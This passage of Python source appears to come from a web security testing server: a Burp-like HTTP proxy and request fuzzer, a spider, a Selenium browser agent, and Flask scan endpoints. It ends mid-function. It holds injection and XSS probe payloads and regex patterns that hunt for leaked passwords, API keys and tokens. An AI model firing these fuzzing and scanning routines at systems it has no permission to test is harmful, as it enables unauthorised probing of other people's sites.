class HTTPTestingFramework:
    """Advanced HTTP testing framework as Burp Suite alternative"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'HexStrike-HTTP-Framework/1.0 (Advanced Security Testing)'
        })
        self.proxy_history = []
        self.vulnerabilities = []
        self.match_replace_rules = []  # [{'where':'query|headers|body|url','pattern':'regex','replacement':'str'}]
        self.scope = None  # {'host': 'example.com', 'include_subdomains': True}
        self._req_id = 0

    def setup_proxy(self, proxy_port: int = 8080):
        """Setup HTTP proxy for request interception"""
        self.session.proxies = {
            'http': f'http://127.0.0.1:{proxy_port}',
            'https': f'http://127.0.0.1:{proxy_port}'
        }

    def intercept_request(self, url: str, method: str = 'GET', data: dict = None,
                         headers: dict = None, cookies: dict = None) -> dict:
        """Intercept and analyze HTTP requests"""
        try:
            if headers:
                self.session.headers.update(headers)
            if cookies:
                self.session.cookies.update(cookies)

            # Apply match/replace rules prior to sending
            url, data, send_headers = self._apply_match_replace(url, data, dict(self.session.headers))
            if headers:
                send_headers.update(headers)

            if method.upper() == 'GET':
                response = self.session.get(url, params=data, headers=send_headers, timeout=30)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=send_headers, timeout=30)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, headers=send_headers, timeout=30)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=send_headers, timeout=30)
            else:
                response = self.session.request(method, url, data=data, headers=send_headers, timeout=30)

            # Store request/response in history
            self._req_id += 1
            request_data = {
                'id': self._req_id,
                'url': url,
                'method': method,
                'headers': dict(response.request.headers),
                'data': data,
                'timestamp': datetime.now().isoformat()
            }

            response_data = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text[:10000],  # Limit content size
                'size': len(response.content),
                'time': response.elapsed.total_seconds()
            }

            self.proxy_history.append({
                'request': request_data,
                'response': response_data
            })

            # Analyze for vulnerabilities
            self._analyze_response_for_vulns(url, response)

            return {
                'success': True,
                'request': request_data,
                'response': response_data,
                'vulnerabilities': self._get_recent_vulns()
            }

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
            return {'success': False, 'error': str(e)}

    # ----------------- Match & Replace and Scope -----------------
    def set_match_replace_rules(self, rules: list):
        """Set match/replace rules. Each rule: {'where','pattern','replacement'}"""
        self.match_replace_rules = rules or []

    def set_scope(self, host: str, include_subdomains: bool = True):
        self.scope = {'host': host, 'include_subdomains': include_subdomains}

    def _in_scope(self, url: str) -> bool:
        if not self.scope:
            return True
        try:
            from urllib.parse import urlparse
            h = urlparse(url).hostname or ''
            target = self.scope.get('host','')
            if not h or not target:
                return True
            if h == target:
                return True
            if self.scope.get('include_subdomains') and h.endswith('.'+target):
                return True
        except Exception:
            return True
        return False

    def _apply_match_replace(self, url: str, data, headers: dict):
        import re
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        original_url = url
        out_headers = dict(headers)
        out_data = data
        for rule in self.match_replace_rules:
            where = (rule.get('where') or 'url').lower()
            pattern = rule.get('pattern') or ''
            repl = rule.get('replacement') or ''
            try:
                if where == 'url':
                    url = re.sub(pattern, repl, url)
                elif where == 'query':
                    pr = urlparse(url)
                    qs = parse_qsl(pr.query, keep_blank_values=True)
                    new_qs = []
                    for k, v in qs:
                        nk = re.sub(pattern, repl, k)
                        nv = re.sub(pattern, repl, v)
                        new_qs.append((nk, nv))
                    url = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(new_qs), pr.fragment))
                elif where == 'headers':
                    out_headers = {re.sub(pattern, repl, k): re.sub(pattern, repl, str(v)) for k, v in out_headers.items()}
                elif where == 'body':
                    if isinstance(out_data, dict):
                        out_data = {re.sub(pattern, repl, k): re.sub(pattern, repl, str(v)) for k, v in out_data.items()}
                    elif isinstance(out_data, str):
                        out_data = re.sub(pattern, repl, out_data)
            except Exception:
                continue
        # Ensure scope restriction
        if not self._in_scope(url):
            logger.warning(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SKIPPED', f'Out of scope: {url}')}" )
            return original_url, data, headers
        return url, out_data, out_headers

    # ----------------- Repeater (custom send) -----------------
    def send_custom_request(self, request_spec: dict) -> dict:
        """Send a custom request with explicit fields, applying rules."""
        url = request_spec.get('url','')
        method = request_spec.get('method','GET')
        headers = request_spec.get('headers') or {}
        cookies = request_spec.get('cookies') or {}
        data = request_spec.get('data')
        return self.intercept_request(url, method, data, headers, cookies)

    # ----------------- Intruder (Sniper mode) -----------------
    def intruder_sniper(self, url: str, method: str = 'GET', location: str = 'query',
                        params: list = None, payloads: list = None, base_data: dict = None,
                        max_requests: int = 100) -> dict:
        """Simple fuzzing: iterate payloads over each parameter individually (Sniper)."""
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        params = params or []
        payloads = payloads or ["'\"<>`, ${7*7}"]
        base_data = base_data or {}
        interesting = []
        total = 0
        baseline = self.intercept_request(url, method, base_data)
        base_status = baseline.get('response',{}).get('status_code') if baseline.get('success') else None
        base_len = baseline.get('response',{}).get('size') if baseline.get('success') else None
        for p in params:
            for pay in payloads:
                if total >= max_requests:
                    break
                m_url = url
                m_data = dict(base_data)
                m_headers = {}
                if location == 'query':
                    pr = urlparse(url)
                    q = dict(parse_qsl(pr.query, keep_blank_values=True))
                    q[p] = pay
                    m_url = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(q), pr.fragment))
                elif location == 'body':
                    m_data[p] = pay
                elif location == 'headers':
                    m_headers[p] = pay
                elif location == 'cookie':
                    self.session.cookies.set(p, pay)
                resp = self.intercept_request(m_url, method, m_data, m_headers)
                total += 1
                if not resp.get('success'):
                    continue
                r = resp['response']
                changed = (base_status is not None and r.get('status_code') != base_status) or (base_len is not None and abs(r.get('size',0) - base_len) > 150)
                reflected = pay in (r.get('content') or '')
                if changed or reflected:
                    interesting.append({
                        'param': p,
                        'payload': pay,
                        'status_code': r.get('status_code'),
                        'size': r.get('size'),
                        'reflected': reflected
                    })
        return {
            'success': True,
            'tested': total,
            'interesting': interesting[:50]
        }

    def _analyze_response_for_vulns(self, url: str, response):
        """Analyze HTTP response for common vulnerabilities"""
        vulns = []

        # Check for missing security headers
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection missing',
            'X-Content-Type-Options': 'MIME type sniffing protection missing',
            'X-XSS-Protection': 'XSS protection missing',
            'Strict-Transport-Security': 'HTTPS enforcement missing',
            'Content-Security-Policy': 'Content Security Policy missing'
        }

        for header, description in security_headers.items():
            if header not in response.headers:
                vulns.append({
                    'type': 'missing_security_header',
                    'severity': 'medium',
                    'description': description,
                    'url': url,
                    'header': header
                })

        # Check for sensitive information disclosure
        sensitive_patterns = [
            (r'password\s*[:=]\s*["\']?([^"\'\s]+)', 'Password disclosure'),
            (r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)', 'API key disclosure'),
            (r'secret\s*[:=]\s*["\']?([^"\'\s]+)', 'Secret disclosure'),
            (r'token\s*[:=]\s*["\']?([^"\'\s]+)', 'Token disclosure')
        ]

        for pattern, description in sensitive_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                vulns.append({
                    'type': 'information_disclosure',
                    'severity': 'high',
                    'description': description,
                    'url': url,
                    'matches': matches[:5]  # Limit matches
                })

        # Check for SQL injection indicators
        sql_errors = [
            'SQL syntax error',
            'mysql_fetch_array',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'PostgreSQL query failed'
        ]

        for error in sql_errors:
            if error.lower() in response.text.lower():
                vulns.append({
                    'type': 'sql_injection_indicator',
                    'severity': 'high',
                    'description': f'Potential SQL injection: {error}',
                    'url': url
                })

        self.vulnerabilities.extend(vulns)

    def _get_recent_vulns(self, limit: int = 10):
        """Get recent vulnerabilities found"""
        return self.vulnerabilities[-limit:] if self.vulnerabilities else []

    def spider_website(self, base_url: str, max_depth: int = 3, max_pages: int = 100) -> dict:
        """Spider website to discover endpoints and forms"""
        try:
            discovered_urls = set()
            forms = []
            to_visit = [(base_url, 0)]
            visited = set()

            while to_visit and len(discovered_urls) < max_pages:
                current_url, depth = to_visit.pop(0)

                if current_url in visited or depth > max_depth:
                    continue

                visited.add(current_url)

                try:
                    response = self.session.get(current_url, timeout=10)
                    if response.status_code == 200:
                        discovered_urls.add(current_url)

                        # Parse HTML for links and forms
                        soup = BeautifulSoup(response.text, 'html.parser')

                        # Find all links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urljoin(current_url, href)

                            if urlparse(full_url).netloc == urlparse(base_url).netloc:
                                if full_url not in visited and depth < max_depth:
                                    to_visit.append((full_url, depth + 1))

                        # Find all forms
                        for form in soup.find_all('form'):
                            form_data = {
                                'url': current_url,
                                'action': urljoin(current_url, form.get('action', '')),
                                'method': form.get('method', 'GET').upper(),
                                'inputs': []
                            }

                            for input_tag in form.find_all(['input', 'textarea', 'select']):
                                form_data['inputs'].append({
                                    'name': input_tag.get('name', ''),
                                    'type': input_tag.get('type', 'text'),
                                    'value': input_tag.get('value', '')
                                })

                            forms.append(form_data)

                except Exception as e:
                    logger.warning(f"Error spidering {current_url}: {str(e)}")
                    continue

            return {
                'success': True,
                'discovered_urls': list(discovered_urls),
                'forms': forms,
                'total_pages': len(discovered_urls),
                'vulnerabilities': self._get_recent_vulns()
            }

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'Spider', str(e))}")
            return {'success': False, 'error': str(e)}

class BrowserAgent:
    """AI-powered browser agent for web application testing and inspection"""

    def __init__(self):
        self.driver = None
        self.screenshots = []
        self.page_sources = []
        self.network_logs = []

    def setup_browser(self, headless: bool = True, proxy_port: int = None):
        """Setup Chrome browser with security testing options"""
        try:
            chrome_options = Options()

            if headless:
                chrome_options.add_argument('--headless')

            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--user-agent=HexStrike-BrowserAgent/1.0 (Security Testing)')

            # Enable logging
            chrome_options.add_argument('--enable-logging')
            chrome_options.add_argument('--log-level=0')

            # Security testing options
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')

            if proxy_port:
                chrome_options.add_argument(f'--proxy-server=http://127.0.0.1:{proxy_port}')

            # Enable network logging
            chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(30)

            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'RUNNING', 'Chrome Browser Initialized')}")
            return True

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
            return False

    def navigate_and_inspect(self, url: str, wait_time: int = 5) -> dict:
        """Navigate to URL and perform comprehensive inspection"""
        try:
            if not self.driver:
                if not self.setup_browser():
                    return {'success': False, 'error': 'Failed to setup browser'}

            nav_command = f'Navigate to {url}'
            logger.info(f"{ModernVisualEngine.format_command_execution(nav_command, 'STARTING')}")

            # Navigate to URL
            self.driver.get(url)
            time.sleep(wait_time)

            # Take screenshot
            screenshot_path = f"/tmp/hexstrike_screenshot_{int(time.time())}.png"
            self.driver.save_screenshot(screenshot_path)
            self.screenshots.append(screenshot_path)

            # Get page source
            page_source = self.driver.page_source
            self.page_sources.append({
                'url': url,
                'source': page_source[:50000],  # Limit size
                'timestamp': datetime.now().isoformat()
            })

            # Extract page information
            page_info = {
                'title': self.driver.title,
                'url': self.driver.current_url,
                'cookies': [{'name': c['name'], 'value': c['value'], 'domain': c['domain']}
                           for c in self.driver.get_cookies()],
                'local_storage': self._get_local_storage(),
                'session_storage': self._get_session_storage(),
                'forms': self._extract_forms(),
                'links': self._extract_links(),
                'inputs': self._extract_inputs(),
                'scripts': self._extract_scripts(),
                'network_requests': self._get_network_logs(),
                'console_errors': self._get_console_errors()
            }

            # Analyze for security issues
            security_analysis = self._analyze_page_security(page_source, page_info)
            # Merge extended passive analysis
            extended_passive = self._extended_passive_analysis(page_info, page_source)
            security_analysis['issues'].extend(extended_passive['issues'])
            security_analysis['total_issues'] = len(security_analysis['issues'])
            security_analysis['security_score'] = max(0, 100 - (security_analysis['total_issues'] * 5))
            security_analysis['passive_modules'] = extended_passive.get('modules', [])

            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', url)}")

            return {
                'success': True,
                'page_info': page_info,
                'security_analysis': security_analysis,
                'screenshot': screenshot_path,
                'timestamp': datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
            return {'success': False, 'error': str(e)}

    # ---------------------- Browser Deep Introspection Helpers ----------------------
    def _get_console_errors(self) -> list:
        """Collect console errors & warnings (if supported)"""
        try:
            logs = self.driver.get_log('browser')
            out = []
            for entry in logs[-100:]:
                lvl = entry.get('level', '')
                if lvl in ('SEVERE', 'WARNING'):
                    out.append({'level': lvl, 'message': entry.get('message', '')[:500]})
            return out
        except Exception:
            return []

    def _analyze_cookies(self, cookies: list) -> list:
        issues = []
        for ck in cookies:
            name = ck.get('name','')
            # Selenium cookie dict may lack flags; attempt JS check if not present
            # (we keep lightweight – deeper flag detection requires CDP)
            if name.lower() in ('sessionid','phpseSSID','jsessionid') and len(ck.get('value','')) < 16:
                issues.append({'type':'weak_session_cookie','severity':'medium','description':f'Session cookie {name} appears short'})
        return issues

    def _analyze_security_headers(self, page_source: str, page_info: dict) -> list:
        # We cannot directly read response headers via Selenium; attempt a lightweight fetch with requests
        issues = []
        try:
            resp = requests.get(page_info.get('url',''), timeout=10, verify=False)
            headers = {k.lower():v for k,v in resp.headers.items()}
            required = {
                'content-security-policy':'CSP header missing (XSS mitigation)',
                'x-frame-options':'X-Frame-Options missing (Clickjacking risk)',
                'x-content-type-options':'X-Content-Type-Options missing (MIME sniffing risk)',
                'referrer-policy':'Referrer-Policy missing (leaky referrers)',
                'strict-transport-security':'HSTS missing (HTTPS downgrade risk)'
            }
            for key, desc in required.items():
                if key not in headers:
                    issues.append({'type':'missing_security_header','severity':'medium','description':desc,'header':key})
            # Weak CSP heuristic
            csp = headers.get('content-security-policy','')
            if csp and "unsafe-inline" in csp:
                issues.append({'type':'weak_csp','severity':'low','description':'CSP allows unsafe-inline scripts'})
        except Exception:
            pass
        return issues

    def _detect_mixed_content(self, page_info: dict) -> list:
        issues = []
        try:
            page_url = page_info.get('url','')
            if page_url.startswith('https://'):
                for req in page_info.get('network_requests', [])[:200]:
                    u = req.get('url','')
                    if u.startswith('http://'):
                        issues.append({'type':'mixed_content','severity':'medium','description':f'HTTP resource loaded over HTTPS page: {u[:100]}'})
        except Exception:
            pass
        return issues

    def _extended_passive_analysis(self, page_info: dict, page_source: str) -> dict:
        modules = []
        issues = []
        # Cookies
        cookie_issues = self._analyze_cookies(page_info.get('cookies', []))
        if cookie_issues:
            issues.extend(cookie_issues); modules.append('cookie_analysis')
        # Headers
        header_issues = self._analyze_security_headers(page_source, page_info)
        if header_issues:
            issues.extend(header_issues); modules.append('security_headers')
        # Mixed content
        mixed = self._detect_mixed_content(page_info)
        if mixed:
            issues.extend(mixed); modules.append('mixed_content')
        # Console errors may hint at DOM XSS sinks
        if page_info.get('console_errors'):
            modules.append('console_log_capture')
        return {'issues': issues, 'modules': modules}

    def run_active_tests(self, page_info: dict, payload: str = '<hexstrikeXSSTest123>') -> dict:
        """Very lightweight active tests (reflection check) - safe mode.
        Only GET forms with text inputs to avoid state-changing operations."""
        findings = []
        tested = 0
        for form in page_info.get('forms', []):
            if form.get('method','GET').upper() != 'GET':
                continue
            params = []
            for inp in form.get('inputs', [])[:3]:  # limit
                if inp.get('type','text') in ('text','search'):
                    params.append(f"{inp.get('name','param')}={payload}")
            if not params:
                continue
            action = form.get('action') or page_info.get('url','')
            if action.startswith('/'):
                # relative
                base = page_info.get('url','')
                try:
                    from urllib.parse import urljoin
                    action = urljoin(base, action)
                except Exception:
                    pass
            test_url = action + ('&' if '?' in action else '?') + '&'.join(params)
            try:
                r = requests.get(test_url, timeout=8, verify=False)
                tested += 1
                if payload in r.text:
                    findings.append({'type':'reflected_xss','severity':'high','description':'Payload reflected in response','url':test_url})
            except Exception:
                continue
            if tested >= 5:
                break
        return {'active_findings': findings, 'tested_forms': tested}

    def _get_local_storage(self) -> dict:
        """Extract local storage data"""
        try:
            return self.driver.execute_script("""
                var storage = {};
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            """)
        except:
            return {}

    def _get_session_storage(self) -> dict:
        """Extract session storage data"""
        try:
            return self.driver.execute_script("""
                var storage = {};
                for (var i = 0; i < sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    storage[key] = sessionStorage.getItem(key);
                }
                return storage;
            """)
        except:
            return {}

    def _extract_forms(self) -> list:
        """Extract all forms from the page"""
        forms = []
        try:
            form_elements = self.driver.find_elements(By.TAG_NAME, 'form')
            for form in form_elements:
                form_data = {
                    'action': form.get_attribute('action') or '',
                    'method': form.get_attribute('method') or 'GET',
                    'inputs': []
                }

                inputs = form.find_elements(By.TAG_NAME, 'input')
                for input_elem in inputs:
                    form_data['inputs'].append({
                        'name': input_elem.get_attribute('name') or '',
                        'type': input_elem.get_attribute('type') or 'text',
                        'value': input_elem.get_attribute('value') or ''
                    })

                forms.append(form_data)
        except:
            pass

        return forms

    def _extract_links(self) -> list:
        """Extract all links from the page"""
        links = []
        try:
            link_elements = self.driver.find_elements(By.TAG_NAME, 'a')
            for link in link_elements[:50]:  # Limit to 50 links
                href = link.get_attribute('href')
                if href:
                    links.append({
                        'href': href,
                        'text': link.text[:100]  # Limit text length
                    })
        except:
            pass

        return links

    def _extract_inputs(self) -> list:
        """Extract all input elements"""
        inputs = []
        try:
            input_elements = self.driver.find_elements(By.TAG_NAME, 'input')
            for input_elem in input_elements:
                inputs.append({
                    'name': input_elem.get_attribute('name') or '',
                    'type': input_elem.get_attribute('type') or 'text',
                    'id': input_elem.get_attribute('id') or '',
                    'placeholder': input_elem.get_attribute('placeholder') or ''
                })
        except:
            pass

        return inputs

    def _extract_scripts(self) -> list:
        """Extract script sources and inline scripts"""
        scripts = []
        try:
            script_elements = self.driver.find_elements(By.TAG_NAME, 'script')
            for script in script_elements[:20]:  # Limit to 20 scripts
                src = script.get_attribute('src')
                if src:
                    scripts.append({'type': 'external', 'src': src})
                else:
                    content = script.get_attribute('innerHTML')
                    if content and len(content) > 10:
                        scripts.append({
                            'type': 'inline',
                            'content': content[:1000]  # Limit content
                        })
        except:
            pass

        return scripts

    def _get_network_logs(self) -> list:
        """Get network request logs"""
        try:
            logs = self.driver.get_log('performance')
            network_requests = []

            for log in logs[-50:]:  # Last 50 logs
                message = json.loads(log['message'])
                if message['message']['method'] == 'Network.responseReceived':
                    response = message['message']['params']['response']
                    network_requests.append({
                        'url': response['url'],
                        'status': response['status'],
                        'mimeType': response['mimeType'],
                        'headers': response.get('headers', {})
                    })

            return network_requests
        except:
            return []

    def _analyze_page_security(self, page_source: str, page_info: dict) -> dict:
        """Analyze page for security vulnerabilities"""
        issues = []

        # Check for sensitive data in local/session storage
        for storage_type, storage_data in [('localStorage', page_info.get('local_storage', {})),
                                          ('sessionStorage', page_info.get('session_storage', {}))]:
            for key, value in storage_data.items():
                if any(sensitive in key.lower() for sensitive in ['password', 'token', 'secret', 'key']):
                    issues.append({
                        'type': 'sensitive_data_storage',
                        'severity': 'high',
                        'description': f'Sensitive data found in {storage_type}: {key}',
                        'location': storage_type
                    })

        # Check for forms without CSRF protection
        for form in page_info.get('forms', []):
            has_csrf = any('csrf' in input_data['name'].lower() or 'token' in input_data['name'].lower()
                          for input_data in form['inputs'])
            if not has_csrf and form['method'].upper() == 'POST':
                issues.append({
                    'type': 'missing_csrf_protection',
                    'severity': 'medium',
                    'description': 'Form without CSRF protection detected',
                    'form_action': form['action']
                })

        # Check for inline JavaScript
        inline_scripts = [s for s in page_info.get('scripts', []) if s['type'] == 'inline']
        if inline_scripts:
            issues.append({
                'type': 'inline_javascript',
                'severity': 'low',
                'description': f'Found {len(inline_scripts)} inline JavaScript blocks',
                'count': len(inline_scripts)
            })

        return {
            'total_issues': len(issues),
            'issues': issues,
            'security_score': max(0, 100 - (len(issues) * 10))  # Simple scoring
        }

    def close_browser(self):
        """Close the browser instance"""
        if self.driver:
            self.driver.quit()
            self.driver = None
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', 'Browser Closed')}")

# Global instances
http_framework = HTTPTestingFramework()
browser_agent = BrowserAgent()

@app.route("/api/tools/http-framework", methods=["POST"])
def http_framework_endpoint():
    """Enhanced HTTP testing framework (Burp Suite alternative)"""
    try:
        params = request.json
        action = params.get("action", "request")  # request, spider, proxy_history, set_rules, set_scope, repeater, intruder
        url = params.get("url", "")
        method = params.get("method", "GET")
        data = params.get("data", {})
        headers = params.get("headers", {})
        cookies = params.get("cookies", {})

        logger.info(f"{ModernVisualEngine.create_section_header('HTTP FRAMEWORK', '🔥', 'FIRE_RED')}")

        if action == "request":
            if not url:
                return jsonify({"error": "URL parameter is required for request action"}), 400

            request_command = f"{method} {url}"
            logger.info(f"{ModernVisualEngine.format_command_execution(request_command, 'STARTING')}")
            result = http_framework.intercept_request(url, method, data, headers, cookies)

            if result.get("success"):
                logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SUCCESS', url)}")
            else:
                logger.error(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'FAILED', url)}")

            return jsonify(result)

        elif action == "spider":
            if not url:
                return jsonify({"error": "URL parameter is required for spider action"}), 400

            max_depth = params.get("max_depth", 3)
            max_pages = params.get("max_pages", 100)

            spider_command = f"Spider {url}"
            logger.info(f"{ModernVisualEngine.format_command_execution(spider_command, 'STARTING')}")
            result = http_framework.spider_website(url, max_depth, max_pages)

            if result.get("success"):
                total_pages = result.get("total_pages", 0)
                pages_info = f"{total_pages} pages"
                logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'SUCCESS', pages_info)}")
            else:
                logger.error(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'FAILED', url)}")

            return jsonify(result)

        elif action == "proxy_history":
            return jsonify({
                "success": True,
                "history": http_framework.proxy_history[-100:],  # Last 100 requests
                "total_requests": len(http_framework.proxy_history),
                "vulnerabilities": http_framework.vulnerabilities,
            })

        elif action == "set_rules":
            rules = params.get("rules", [])
            http_framework.set_match_replace_rules(rules)
            return jsonify({"success": True, "rules_set": len(rules)})

        elif action == "set_scope":
            scope_host = params.get("host")
            include_sub = params.get("include_subdomains", True)
            if not scope_host:
                return jsonify({"error": "host parameter required"}), 400
            http_framework.set_scope(scope_host, include_sub)
            return jsonify({"success": True, "scope": http_framework.scope})

        elif action == "repeater":
            request_spec = params.get("request") or {}
            result = http_framework.send_custom_request(request_spec)
            return jsonify(result)

        elif action == "intruder":
            if not url:
                return jsonify({"error": "URL parameter required"}), 400
            method = params.get("method", "GET")
            location = params.get("location", "query")
            fuzz_params = params.get("params", [])
            payloads = params.get("payloads", [])
            base_data = params.get("base_data", {})
            max_requests = params.get("max_requests", 100)
            result = http_framework.intruder_sniper(
                url, method, location, fuzz_params, payloads, base_data, max_requests
            )
            return jsonify(result)

        else:
            return jsonify({"error": f"Unknown action: {action}"}), 400

    except Exception as e:
        logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/browser-agent", methods=["POST"])
def browser_agent_endpoint():
    """AI-powered browser agent for web application inspection"""
    try:
        params = request.json or {}
        action = params.get("action", "navigate")  # navigate, screenshot, close
        url = params.get("url", "")
        headless = params.get("headless", True)
        wait_time = params.get("wait_time", 5)
        proxy_port = params.get("proxy_port")
        active_tests = params.get("active_tests", False)

        logger.info(
            f"{ModernVisualEngine.create_section_header('BROWSER AGENT', '🌐', 'CRIMSON')}"
        )

        if action == "navigate":
            if not url:
                return (
                    jsonify({"error": "URL parameter is required for navigate action"}),
                    400,
                )

            # Setup browser if not already done
            if not browser_agent.driver:
                setup_success = browser_agent.setup_browser(headless, proxy_port)
                if not setup_success:
                    return jsonify({"error": "Failed to setup browser"}), 500

            result = browser_agent.navigate_and_inspect(url, wait_time)
            if result.get("success") and active_tests:
                active_results = browser_agent.run_active_tests(
                    result.get("page_info", {})
                )
                result["active_tests"] = active_results
                if active_results["active_findings"]:
                    logger.warning(
                        ModernVisualEngine.format_error_card(
                            "WARNING",
                            "BrowserAgent",
                            f"Active findings: {len(active_results['active_findings'])}",
                        )
                    )
            return jsonify(result)

        elif action == "screenshot":
            if not browser_agent.driver:
                return (
                    jsonify(
                        {"error": "Browser not initialized. Use navigate action first."}
                    ),
                    400,
                )

            screenshot_path = f"/tmp/hexstrike_screenshot_{int(time.time())}.png"
            browser_agent.driver.save_screenshot(screenshot_path)

            return jsonify(
                {
                    "success": True,
                    "screenshot": screenshot_path,
                    "current_url": browser_agent.driver.current_url,
                    "timestamp": datetime.now().isoformat(),
                }
            )

        elif action == "close":
            browser_agent.close_browser()
            return jsonify({"success": True, "message": "Browser closed successfully"})

        elif action == "status":
            return jsonify(
                {
                    "success": True,
                    "browser_active": browser_agent.driver is not None,
                    "screenshots_taken": len(browser_agent.screenshots),
                    "pages_visited": len(browser_agent.page_sources),
                }
            )

        else:
            return jsonify({"error": f"Unknown action: {action}"}), 400

    except Exception as e:
        logger.error(
            f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}"
        )
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/burpsuite-alternative", methods=["POST"])
def burpsuite_alternative():
    """Comprehensive Burp Suite alternative combining HTTP framework and browser agent"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "comprehensive")  # comprehensive, spider, passive, active
        headless = params.get("headless", True)
        max_depth = params.get("max_depth", 3)
        max_pages = params.get("max_pages", 50)

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        logger.info(f"{ModernVisualEngine.create_section_header('BURP SUITE ALTERNATIVE', '🔥', 'BLOOD_RED')}")
        scan_message = f'Starting {scan_type} scan of {target}'
        logger.info(f"{ModernVisualEngine.format_highlighted_text(scan_message, 'RED')}")

        results = {
            'target': target,
            'scan_type': scan_type,
            'timestamp': datetime.now().isoformat(),
            'success': True
        }

        # Phase 1: Browser-based reconnaissance
        if scan_type in ['comprehensive', 'spider']:
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'RUNNING', 'Reconnaissance Phase')}")

            if not browser_agent.driver:
                browser_agent.setup_browser(headless)

            browser_result = browser_agent.navigate_and_inspect(target)
            results['browser_analysis'] = browser_result

        # Phase 2: HTTP spidering
        if scan_type in ['comprehensive', 'spider']:
            logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'RUNNING', 'Discovery Phase')}")

            spider_result = http_framework.spider_website(target, max_depth, max_pages)
            results['spider_analysis'] = spider_result

        # Phase 3: Vulnerability analysis
        if scan_type in ['comprehensive', 'active']:
            logger.info(f"{ModernVisualEngine.format_tool_status('VulnScanner', 'RUNNING', 'Analysis Phase')}")

            # Test discovered endpoints
            discovered_urls = results.get('spider_analysis', {}).get('discovered_urls', [target])
            vuln_results = []

            for url in discovered_urls[:20]:  # Limit to 20 URLs
                test_result = http_framework.intercept_request(url)
                if test_result.get('success'):
                    vuln_results.append(test_result)

            results['vulnerability_analysis'] = {
                'tested_urls': len(vuln_results),
                'total_vulnerabilities': len(http_framework.vulnerabilities),
                'recent_vulnerabilities': http_framework._get_recent_vulns(20)
            }

        # Generate summary
        total_vulns = len(http_framework.vulnerabilities)
        vuln_summary = {}
        for vuln in http_framework.vulnerabilities:
            severity = vuln.get('severity', 'unknown')
            vuln_summary[severity] = vuln_summary.get(severity, 0) + 1

        results['summary'] = {
            'total_vulnerabilities': total_vulns,
            'vulnerability_breakdown': vuln_summary,
            'pages_analyzed': len(results.get('spider_analysis', {}).get('discovered_urls', [])),
            'security_score': max(0, 100 - (total_vulns * 5))
        }

        # Display summary with enhanced colors
        logger.info(f"{ModernVisualEngine.create_section_header('SCAN COMPLETE', '✅', 'SUCCESS')}")
        vuln_message = f'Found {total_vulns} vulnerabilities'
        color_choice = 'YELLOW' if total_vulns > 0 else 'GREEN'
        logger.info(f"{ModernVisualEngine.format_highlighted_text(vuln_message, color_choice)}")

        for severity, count in vuln_summary.items():
            logger.info(f"  {ModernVisualEngine.format_vulnerability_severity(severity, count)}")

        return jsonify(results)

    except Exception as e:
        logger.error(f"{ModernVisualEngine.format_error_card('CRITICAL', 'BurpAlternative', str(e))}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500
        logger.error(f"💥 Error in burpsuite endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/zap", methods=["POST"])
def zap():
    """Execute OWASP ZAP with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "baseline")
        api_key = params.get("api_key", "")
        daemon = params.get("daemon", False)
        port = params.get("port", "8090")
        host = params.get("host", "0.0.0.0")
        format_type = params.get("format", "xml")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not target and scan_type != "daemon":
            logger.warning("🎯 ZAP called without target parameter")
            return jsonify({
                "error": "Target parameter is required for scans"
            }), 400

